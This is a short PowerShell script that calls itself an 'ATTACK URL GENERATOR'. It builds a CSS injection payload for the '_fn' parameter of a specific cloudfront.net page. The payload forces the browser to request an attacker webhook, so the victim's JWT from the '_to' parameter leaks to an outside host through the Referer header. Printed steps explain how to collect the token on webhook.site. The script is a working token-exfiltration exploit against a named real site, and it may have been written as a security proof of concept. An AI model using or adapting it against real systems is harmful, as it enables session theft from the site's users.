param(
    [Parameter(Mandatory=$true)]
    [string]$WebhookUrl,
    
    [Parameter(Mandatory=$true)]
    [string]$VictimToken
)

Write-Host ""
Write-Host "=== ATTACK URL GENERATOR ===" -ForegroundColor Red
Write-Host ""

# URL encode the webhook URL for CSS
$encodedWebhook = [System.Web.HttpUtility]::UrlEncode($WebhookUrl)

# CSS injection payload: x';}*{background:url('WEBHOOK')}/*
# This closes the font-family, injects CSS, and comments out the rest
$cssPayload = "x%27%3B%7D*%7Bbackground%3Aurl%28%27$encodedWebhook%27%29%7D/*"

# Build the full attack URL
$attackUrl = "https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=$VictimToken&_fn=$cssPayload&_fo=y&_la=es&_cu=ars"

Write-Host "ATTACK URL:" -ForegroundColor Yellow
Write-Host ""
Write-Host $attackUrl -ForegroundColor Green
Write-Host ""
Write-Host "Instructions:" -ForegroundColor Cyan
Write-Host "1. Open this URL in browser"
Write-Host "2. Check webhook.site for incoming request"
Write-Host "3. Look at Referer header - it contains the full JWT!"
Write-Host ""
Write-Host "What happens:" -ForegroundColor Magenta
Write-Host "- CSS injection triggers: background:url('$WebhookUrl')"
Write-Host "- Browser makes request to webhook"
Write-Host "- Referer header contains: ...?_to=$($VictimToken.Substring(0,50))..."
